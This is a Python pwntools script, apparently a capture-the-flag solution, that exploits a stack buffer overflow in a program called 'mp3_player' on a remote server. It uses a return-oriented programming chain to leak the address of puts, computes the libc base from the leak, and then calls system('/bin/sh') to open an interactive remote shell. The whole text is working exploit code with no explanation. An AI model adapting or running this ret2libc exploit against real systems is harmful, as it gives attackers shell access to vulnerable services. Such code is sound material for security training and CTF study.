from pwn import *

context.arch = 'amd64'
elf = ELF('./mp3_player', checksec=False)
libc = ELF('./libc.so', checksec=False)

offset = 40

p = remote("motherload.td.org.uit.no", 8006)

#First ropchain
rop = ROP(elf)
rop.raw(b"\x90"*offset)
rop.call("puts", [elf.got["puts"]])
rop.call(elf.symbols["main"])

#Send
p.recvuntil("ABBA")
p.sendline(rop.chain())

# We get the leaked address.
p.recvuntil(b"song\n")
puts_leak = u64(p.recvline().rstrip().ljust(8, b"\x00"))
log.info(f"Puts address found: {hex(puts_leak)}")
libc.address = puts_leak - libc.symbols["puts"]

rop = ROP(libc)
rop.raw(b"\x90" * offset)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00"))])
rop.call("system", [ next(libc.search(b"/bin/sh\x00")) ])

p.recvuntil(b"ABBA")
p.sendline(rop.chain())
p.interactive()
